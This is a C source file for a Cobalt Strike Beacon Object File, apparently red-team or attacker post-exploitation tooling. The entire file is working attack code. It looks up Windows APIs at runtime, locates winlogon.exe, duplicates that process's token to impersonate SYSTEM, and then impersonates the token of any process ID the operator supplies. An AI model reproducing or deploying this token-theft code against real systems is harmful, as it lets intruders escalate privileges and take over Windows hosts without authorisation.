#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "beacon.h"

#define DEBUG FALSE

#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }

DECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);
DECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);


FARPROC Resolver(CHAR *lib, CHAR *func);
DWORD GetProcByPID(CHAR *name);
BOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage);
BOOL ElevateSystem(HANDLE *handle);
BOOL ElevateByPID(HANDLE *handle, DWORD PID);

FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);
    if(DEBUG) {
	    printf("[%s] %s!%s at 0x%p\n", __func__, lib, func, ptr);
    }
	return ptr;
}

DWORD GetProcByPID(CHAR *name) {
    FARPROC CreateToolhelp32Snapshot = Resolver("kernel32.dll", "CreateToolhelp32Snapshot");
    FARPROC Process32First = Resolver("kernel32.dll", "Process32First");
    FARPROC Process32Next = Resolver("kernel32.dll", "Process32Next");
    FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");
    FARPROC strcmp = Resolver("msvcrt.dll", "strcmp");

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD PID = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)) {
        do {
        if(strcmp(pe32.szExeFile, name) == 0) {
            PID = pe32.th32ProcessID;
            printf("[%s] Process %s PID is %d\n", __func__, name, PID);
            break;
        }
        } while(Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return PID;
}

BOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage) {
    FARPROC OpenProcess = Resolver("kernel32.dll", "OpenProcess");
    FARPROC OpenProcessToken = Resolver("kernel32.dll", "OpenProcessToken");
    FARPROC DuplicateTokenEx = Resolver("advapi32.dll", "DuplicateTokenEx");
    FARPROC ImpersonateLoggedOnUser = Resolver("advapi32.dll", "ImpersonateLoggedOnUser");
    FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");
    FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);

    if(hProc == NULL) {
        printf("[%s] OpenProcess on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        return FALSE;
    }

    HANDLE hToken = NULL;
    if(!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
        printf("[%s] OpenProcessToken on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    CloseHandle(hProc);
    
    HANDLE hDup = NULL;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = FALSE;

    if(!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenImpersonation, &hDup)) {
        printf("[%s] DuplicateTokenEx on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hToken);
        return FALSE;       
    }
    CloseHandle(hToken);

    if(!ImpersonateLoggedOnUser(hDup)) {
        printf("[%s] ImpersonateLoggedOnUser on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hDup);
        return FALSE;            
    }

    *hStorage = hDup;

    return TRUE;
}

BOOL ElevateSystem(HANDLE *hTokenSystem) {
    DWORD PID = GetProcByPID("winlogon.exe");
    if(PID != 0) {
        if(ImpersonateByPID(PID, hTokenSystem)) {
            printf("[%s] ImpersonateByPID(SYSTEM) succeeded.\n", __func__);
        }
    }
}

BOOL ElevateByPID(HANDLE *hTokenPID, DWORD PID) {
    if(ImpersonateByPID(PID, hTokenPID)) {
        printf("[%s] ImpersonateByPID(%d) succeeded.\n", __func__, PID);
    }
}

int go(char * args, int length) {
    FARPROC atoi = Resolver("msvcrt.dll", "atoi");
    datap parser;

    BeaconDataParse(&parser, args, length);

    DWORD PID = atoi(BeaconDataExtract(&parser, NULL));
    HANDLE hTokenSystem = NULL;
    HANDLE hTokenPID = NULL;

    FARPROC SetThreadToken = Resolver("kernel32.dll", "SetThreadToken");
    FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");
    
    ElevateSystem(&hTokenSystem);
    ElevateByPID(&hTokenPID, PID);

    printf("[%s] (SYSTEM) Token HANDLE 0x%p.\n", __func__, hTokenSystem);
    printf("[%s] (%d) Token HANDLE 0x%p.\n", __func__, PID, hTokenPID);
    
    if(!SetThreadToken(NULL, hTokenSystem)) {
        printf("[%s] (SYSTEM) SetThreadToken failed. Error: %d.\n", __func__, GetLastError());       
    }
    
    if(hTokenPID != NULL) {
        if(!SetThreadToken(NULL, hTokenPID)) {
            printf("[%s] (%d) SetThreadToken failed. Error: %d.\n", __func__, PID, GetLastError());       
        }
    }

    printf("Process Completed.\n");

    return 0;
}